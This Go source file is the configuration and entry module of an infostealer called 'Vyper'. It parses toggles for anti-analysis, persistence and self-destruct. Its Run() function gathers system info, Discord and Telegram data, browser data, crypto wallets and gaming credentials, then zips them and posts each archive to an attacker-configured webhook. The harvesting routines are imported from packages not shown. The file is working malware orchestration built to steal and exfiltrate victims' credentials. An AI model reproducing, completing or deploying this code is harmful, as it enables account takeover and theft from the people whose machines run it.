package config

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"vyper/Stub/antianalysis"
	"vyper/Stub/exfiltration"
	"vyper/Stub/infostealer"
	"vyper/Stub/persistance"

	"github.com/bigkevmcd/go-configparser"
)

type Vyper struct {
	antianalysis bool
	persist      bool
	selfdestruct bool
	discord      bool
	browser      bool
	crypto       bool
	gaming       bool
	webhook      bool

	webhookurl  string
	webhooktype string
}

func Parse(configfile string) Vyper {
	config, _ := configparser.ParseReader(strings.NewReader(configfile))
	configstruct := Vyper{}

	val_antianalysis, _ := config.Get("main_toggles", "antianalysis")
	val_persist, _ := config.Get("main_toggles", "persist")
	val_selfdestruct, _ := config.Get("main_toggles", "selfdestruct")
	val_discord, _ := config.Get("main_toggles", "discord")
	val_browser, _ := config.Get("main_toggles", "browser")
	val_crypto, _ := config.Get("main_toggles", "crypto")
	val_gaming, _ := config.Get("main_toggles", "gaming")
	val_webhook, _ := config.Get("main_toggles", "webhook")

	var val_webhookurl string
	if val_webhook == "true" {
		val_webhookurl, _ = config.Get("webhook_info", "url")
	} else {
		val_webhookurl = "false"
	}

	configstruct.antianalysis, _ = strconv.ParseBool(val_antianalysis)
	configstruct.persist, _ = strconv.ParseBool(val_persist)
	configstruct.selfdestruct, _ = strconv.ParseBool(val_selfdestruct)
	configstruct.discord, _ = strconv.ParseBool(val_discord)
	configstruct.browser, _ = strconv.ParseBool(val_browser)
	configstruct.crypto, _ = strconv.ParseBool(val_crypto)
	configstruct.gaming, _ = strconv.ParseBool(val_gaming)
	configstruct.webhook, _ = strconv.ParseBool(val_webhook)
	configstruct.webhookurl = val_webhookurl

	return configstruct
}

func (config *Vyper) Run() {
	fmt.Printf("[DEBUG] Starting Vyper Run()\n")
	var data exfiltration.DataStruct

	data.SysInfo = infostealer.System()

	if config.antianalysis {
		go antianalysis.AntiAnalysis()
	}

	if config.persist {
		fmt.Printf("PERSISTANCE ENABLED BY ACCIDENT ABORT NOW YOU HAVE 5 SECONDS")
		time.Sleep(5 * time.Second)
		go persistance.Persist()
	}

	if config.discord {
		data.Messaging.DiscordInfo, data.Messaging.Tdata = infostealer.Messaging()
	}

	if config.browser {
		data.Browsers.ChromiumInfo = infostealer.Chromium()
		data.Browsers.GeckoInfo = infostealer.Firefox()
	}

	if config.crypto {
		data.CryptoWallets = infostealer.Crypto()
	}

	if config.gaming {
		data.GamingPlatforms = infostealer.Gaming()
	}

	fmt.Printf("[DEBUG] Exfiltrating data into ZipMap...\n")
	zipMap := data.Exfiltrate()

	if config.webhook {
		for category, zipData := range zipMap {
			if len(zipData) == 0 {
				continue
			}

			fmt.Printf("[DEBUG] Processing %s (%d bytes)\n", category, len(zipData))
			err := exfiltration.PostFileWebhook(config.webhookurl, zipData, category, &data)

			if err != nil {
				fmt.Printf("[DEBUG] %s FAILED: %v\n", category, err)
			} else {
				fmt.Printf("[DEBUG] %s SUCCESS\n", category)
			}
		}
	}
}
